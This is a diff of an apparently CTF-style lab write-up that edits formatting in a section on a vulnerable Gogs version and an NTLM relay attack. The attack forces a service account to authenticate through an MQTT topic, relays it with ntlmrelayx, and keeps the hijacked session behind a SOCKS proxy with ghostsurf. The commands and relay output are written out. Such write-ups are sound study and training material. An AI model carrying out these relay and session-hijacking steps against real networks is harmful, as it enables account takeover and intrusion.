@@ -175,18 +175,23 @@ The asset query string leaks the exact commit the server is running. Looking it 
 ![](./screens/gogs4.png)
 
 
+Gogs 0.13.3 is vulnerable to **CVE-2025-8110**, an authenticated RCE, but no valid Gogs credentials are known yet, so this is noted for later.
 
-Gogs 0.13.3 is vulnerable to **CVE-2025-8110**, an authenticated RCE — but no valid Gogs credentials are known yet, so this is parked for later.
+![](./screens/gogs1.png)
 
-./screens/gogs1.png ./screens/gogs2.png ./screens/gogs3.png
+
+![](./screens/gogs2.png)
+
+![](./screens/gogs3.png)
 
 ### Bypassing the Login on gpz-op26-secure via NTLM Relay
 
-`gpz-op26-secure.ghostlink.htb` presents an HTTP NTLM (Windows-integrated) login prompt:
+`gpz-op26-secure.ghostlink.htb` presents a login prompt:
 
-./screens/1.png
+![](./screens/1.png)
 
-Since `svc_canary` can be forced to authenticate anywhere on demand (via the MQTT callback), its session can simply be _relayed_ into this site's login instead of being cracked. A plain, single-shot relay confirms it works:
+
+Since `svc_canary` can be forced to authenticate anywhere on demand (via the MQTT callback), its session can simply be _relayed_ into this site's login instead of being cracked. A relay confirms it works:
 
 ```
 mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
@@ -198,7 +203,7 @@ python3 ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 -
 [*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
 ```
 
-`ntlmrelayx` only keeps a relayed connection alive for a single request/response, though — not enough to actually browse the app. **ghostsurf** ([senderend/ghostsurf](https://github.com/senderend/ghostsurf)) solves that: it relays NTLM auth and exposes the hijacked, authenticated session through a persistent SOCKS proxy, so the attacker can browse the site as the victim in real time.
+`ntlmrelayx` only keeps a relayed connection alive for a single request/response, though. Not enough to actually browse the app. **ghostsurf** ([senderend/ghostsurf](https://github.com/senderend/ghostsurf)) solves that: it relays NTLM auth and exposes the hijacked, authenticated session through a persistent SOCKS proxy, so the attacker can browse the site as the victim in real time.
 
 ```
 python3 ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb --keep-relaying --kernel-auth --http-port 8888
@@ -207,7 +212,7 @@ python3 ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb --keep-relaying --k
 
 The vendored relay config is missing an attribute the server expects. Patching `lib/relay/utils/config.py` to initialize it fixes the crash:
 
-./screens/2.png
+![](./screens/2.png)
 
 ```python
 # lib/relay/utils/config.py
@@ -228,7 +233,9 @@ HTTP      gpz-op26-secure.ghostlink.htb  GHOSTLINK/SVC_CANARY  80
 
 Pointing Burp/browser at the SOCKS proxy (`127.0.0.1:1080`) now loads the site fully authenticated as `svc_canary`:
 
-./screens/3.png
+![](./screens/burp.png)
+
+![](./screens/3.png)
 
 ---
 
@@ -236,9 +243,9 @@ Pointing Burp/browser at the SOCKS proxy (`127.0.0.1:1080`) now loads the site f
 
 The portal lets a visitor upload a file and returns a "classified channel" download link:
 
-./screens/4.png
+![](./screens/4.png)
 
-A first upload attempt through the relay hit a snag — the relay's own HTTP body-handling mangled POST payloads containing `=` characters (base64), breaking the upload:
+A first upload attempt through the relay hit a problem as the relay's own HTTP body-handling mangled POST payloads containing `=` characters (base64), breaking the upload:
 
 ./screens/5.png
 
